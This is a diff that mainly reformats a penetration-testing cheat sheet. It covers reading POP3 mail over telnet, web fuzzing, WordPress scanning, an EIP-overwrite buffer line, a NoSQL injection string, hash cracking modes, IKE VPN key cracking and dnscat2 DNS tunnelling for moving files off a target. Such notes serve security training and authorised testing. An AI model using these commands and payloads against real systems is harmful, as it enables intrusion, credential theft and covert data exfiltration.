@@ -352,30 +352,30 @@ help
 
 - POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet
 
-    ```text
-    root@kali:~# telnet $ip 110
-    +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
-    USER billydean    
-    +OK
-    PASS password
-    +OK Welcome billydean
+      ```text
+      root@kali:~# telnet $ip 110
+      +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
+      USER billydean    
+      +OK
+      PASS password
+      +OK Welcome billydean
 
-    list
+      list
 
-    +OK 2 1807
-    1 786
-    2 1021
+      +OK 2 1807
+      1 786
+      2 1021
 
-    retr 1
+      retr 1
 
-    +OK Message follows
-    From: jamesbrown@motown.com
-    Dear Billy Dean,
+      +OK Message follows
+      From: jamesbrown@motown.com
+      Dear Billy Dean,
 
-    Here is your login for remote desktop ... try not to forget it this time!
-    username: billydean
-    password: PA$$W0RD!Z
-    ```
+      Here is your login for remote desktop ... try not to forget it this time!
+      username: billydean
+      password: PA$$W0RD!Z
+      ```
 
 ### SNMP Enumeration -Simple Network Management Protocol
 
@@ -579,53 +579,35 @@ help
 
 - Wfuzz - The web brute forcer
 
-        `wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test`
-
-        `wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ`
-
-        `wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"`
-
-        `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ`
-
-        Recurse level 3
-
-        `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`
+      ```shell
+      wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
+      wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ
+      wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
+      wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
+      ```
+  - Recurse level 3
+      `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`
 
 - We can also use a tool called dirhunt to search for interesting files
 
-<!-- -->
-
 - Open a service using a port knock (Secured with Knockd)  
-    for x in 7000 8000 9000; do nmap -Pn --host_timeout 201
-    --max-retries 0 -p $x server_ip_address; done
-
+    `for x in 7000 8000 9000; do nmap -Pn --host_timeout 201
+    --max-retries 0 -p $x server_ip_address; done`
 - WordPress Scan - Wordpress security scanner ( We can use the --enumerate function to enumerate users and bruteforce )
-
-  - wpscan --url $ip/blog --proxy $ip:3129
-
+  - `wpscan --url $ip/blog --proxy $ip:3129`
 - RSH Enumeration - Unencrypted file transfer system
-
-  - auxiliary/scanner/rservices/rsh_login
-
+  - `auxiliary/scanner/rservices/rsh_login`
 - Finger Enumeration
-
-  - finger @$ip
-
-  - finger batman@$ip
-
+  - `finger @$ip`
+  - `finger batman@$ip`
 - TLS & SSL Testing
-
-  - ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha >
-        OUTPUT-FILE.html
-
+  - `./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html`
 - Proxy Enumeration (useful for open proxies)
-
-  - nikto -useproxy <http://$ip:3128> -h $ip
+  - `nikto -useproxy <http://$ip:3128> -h $ip`
 
 ## Buffer Overflow
 
-- DEP and ASLR - Data Execution Prevention (DEP) and Address Space
-    Layout Randomization (ASLR)
+- DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)
 
 ### Nmap Fuzzers
 
@@ -634,11 +616,11 @@ help
 
 - NMap HTTP Form Fuzzer  
 
-    ```shell
-    nmap --script http-form-fuzzer --script-args
-    'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'
-    -p 80 $ip
-    ```
+      ```shell
+      nmap --script http-form-fuzzer --script-args
+      'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'
+      -p 80 $ip
+      ```
 
 - Nmap DNS Fuzzer  
     `nmap --script dns-fuzz --script-args timelimit=2h $ip -d`
@@ -652,12 +634,12 @@ help
 
 - Controlling EIP
 
-    ```shell
-    locate pattern_create
-    pattern_create.rb -l 2700
-    locate pattern_offset
-    pattern_offset.rb -q 39694438
-    ```
+      ```shell
+      locate pattern_create
+      pattern_create.rb -l 2700
+      locate pattern_offset
+      pattern_offset.rb -q 39694438
+      ```
 
 - Verify exact location of EIP - [\*] Exact match at offset 2606
 
@@ -677,11 +659,11 @@ help
 
 - Run Mona in immunity log window to find (FFE4) XEF command
 
-    ```shell
-    !mona find -s "\xff\xe4" -m slmfc.dll  
-    found at 0x5f4a358f - Flip around for little endian format
-    buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
-    ```
+      ```shell
+      !mona find -s "\xff\xe4" -m slmfc.dll  
+      found at 0x5f4a358f - Flip around for little endian format
+      buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
+      ```
 
     **We can use the view -> show executables modules and search for the instruction in the immunity debugger.**
 
@@ -1903,18 +1885,16 @@ joomscan
       `a'; return this.a != 'BadData’'; var dummy='!`
 
 - Password Attacks
-    --------------------------------------------------------------------------------------------------------------
-
   - AES Decryption  
         <http://aesencryption.net/>
 
   - Convert multiple webpages into a word list
 
-        ```shell
-        for x in 'index' 'about' 'post' 'contact' ; do \
-          curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \
-        done
-        ```
+      ```shell
+      for x in 'index' 'about' 'post' 'contact' ; do \
+      curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \
+      done
+      ```
 
   - Or convert html to word list dict  
         `html2dic index.html.out | sort -u > index-html.dict`
@@ -2068,28 +2048,26 @@ joomscan
     Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.
 
       `apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev`
-
       and
-
       `apt-get install pocl-opencl-icd`
 
-    Cracking Linux Hashes - /etc/shadow file
+    - Cracking Linux Hashes - /etc/shadow file
 
-    ```
-     500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
-    3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
-    7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
-    1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
-    ```
+      ```
+      500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
+      3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
+      7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
+      1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
+      ```
 
-    Cracking Windows Hashes
+    - Cracking Windows Hashes
 
     ```
     3000 | LM                                               | Operating-Systems
     1000 | NTLM                                             | Operating-Systems
     ```
 
-    Cracking Common Application Hashes
+    - Cracking Common Application Hashes
 
     ```
       900 | MD4                                              | Raw Hash
@@ -2222,7 +2200,8 @@ joomscan
         `./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic`
         Bruteforce IKE VPN using IKEForce:  
         `./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1`
-        Use ike-scan to capture the PSK hash:  
+        Use ike-scan to capture the PSK hash:
+
         ```shell
         ike-scan  
         ike-scan TARGET-IP  
@@ -2230,7 +2209,9 @@ joomscan
         ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
         ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
         ```
-        Use psk-crack to crack the PSK hash  
+
+        Use psk-crack to crack the PSK hash
+
         ```shell
         psk-crack hash-file.txt  
         pskcrack  
@@ -2238,6 +2219,7 @@ joomscan
         psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key  
         psk-crack -d /path/to/dictionary-file TARGET-IP-key
         ```
+
 - PPTP Hacking
   - Identifying PPTP, it listens on TCP: 1723  
         NMAP PPTP Fingerprint:  
@@ -2254,6 +2236,7 @@ joomscan
 - DNS Tunneling
   - dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.
   - Attacking Machine Installation:
+
       ```shell
       apt-get update  
       apt-get -y install ruby-dev git make g++  
@@ -2262,12 +2245,15 @@ joomscan
       cd dnscat2/server  
       bundle install
       ```
+
   - Run dnscat2:
+
       ```shell
       ruby ./dnscat2.rb  
       dnscat2> New session established: 1422  
       dnscat2> session -i 1422
       ```
+
   - Target Machine:  
         [*https://downloads.skullsecurity.org/dnscat2/*](https://downloads.skullsecurity.org/dnscat2/)
         [*https://github.com/lukebaggett/dnscat2-powershell/*](https://github.com/lukebaggett/dnscat2-powershell/)
